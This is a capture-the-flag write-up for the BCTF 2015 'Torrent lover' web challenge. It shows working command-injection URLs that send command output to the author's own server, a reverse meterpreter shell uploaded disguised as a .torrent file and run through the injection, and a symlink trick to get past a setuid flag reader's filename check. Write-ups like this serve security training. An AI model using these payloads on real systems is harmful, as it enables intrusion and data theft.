### Solved by Swappage

Torrent lover was a 235 points worth challenge in BCTF 2015.

The obective was to pwn a web application and read the flag out of it.

Everything started with a form, which would allow you to specify an URL, from which the server
would download a .torrent file, process it, and print out basic torrent informations like files
content, tracker URL and the file name.

The page which was displaying the result was suffering from persistent XSS attack, but this was
simply a disguise to lure in the wrong direction, as the objective was to obtain code execution
on the server.

I quickly set up a web server and started to sniff some traffic, and this lured me, again,
in the wrong direction

In fact the HTTP request coming from the remote application looked like this:

    User-Agent: Wget/1.13.4 (linux-gnu)
    Accept: */*
    Host: 127.0.0.1:8443
    Connection: Keep-Alive

and considering the user agent, i wrongly focused my attention on the wget version, in an attempt
to exploit CVE-2014-4877, which affects all versions prior to 1.16: i thought that maybe by exploiting
this vulnerability i could write an arbitrary file in a known path and gain code execution from there.

I was wrong tho, and the story was completely different:
The application was vulnerable to a way simplier command injection attack, i discovered that
i could execute arbitrary code on the server by requesting an URL which looked like this

    http://my.webserver.host/$(command).torrent

The only restrictions i had for the command to be properly executed, were that

- the URL had to end with the *.torrent* string
- the whole URL couldn't contain spaces.

this was a pretty bad constraint, the enumeration was tedious and i really needed to figure out
where the torrents files downloaded by the web app were stored for processing.

The page displaying the result suggested me that the filese were indeed stored on disk before being
handled, because by requesting the same file twice, the second one would be displayed with a .1
appended to the name, which in general, happens when wgets finds a file on disk with the same name
in the same path.

to enumerate the paths i used simple command injections like

    http://my.webserver.host/$(pwd|base64)

and then read the output in my web server log which looked like this:

    218.2.197.253 - - [22/Mar/2015:14:52:57 +0100] "GET /1.php?i=L3Zhci93d3cvd29yawo=.torrent

and once i finally spotted that the absolute path where the downloaded files were stored was

    /var/www/work/zhongzi

i uploaded a .torrent file containing a python reverse meterpreter and popped a shell by sending

    http://my.webserver.host/$(python</var/www/work/zhongzi/swappage.torrent).torrent

After all, the only check that was performed was on the file extension, and nothing more.

Once i got the shell to read the flag we needed to run a suid binary that would output the flag
but it was performing a check on the argument that was passed which couldn't contain the word flag

    www-data@ubuntu-box:/var/www/flag$ ./use_me_to_read_flag flag
    ./use_me_to_read_flag flag
    You may not access 'flag'
    www-data@ubuntu-box:/var/www/flag$

the problem was quickly solved by symlinking the flag and then run the program against
the different file name, since the program wasn't resolving the original file name.

    www-data@ubuntu-box:/var/www/work/zhongzi$ ln -s /var/www/flag/flag merumerumeeee
    en -s /var/www/flag/flag merumerumeee
    www-data@ubuntu-box:/var/www/work/zhongzi$ /var/www/flag/use_me_to_read_flag merumerumeeee
    umerumeeeelag/use_me_to_read_flag mer
    BCTF{Do_not_play_dota2_or_you_will_be_stupid_like_me233}
    www-data@ubuntu-box:/var/www/work/zhongzi$ rm merumerumeeee
    rm merumerumeeee
    www-data@ubuntu-box:/var/www/work/zhongzi$ exit

the flag was

    BCTF{Do_not_play_dota2_or_you_will_be_stupid_like_me233}

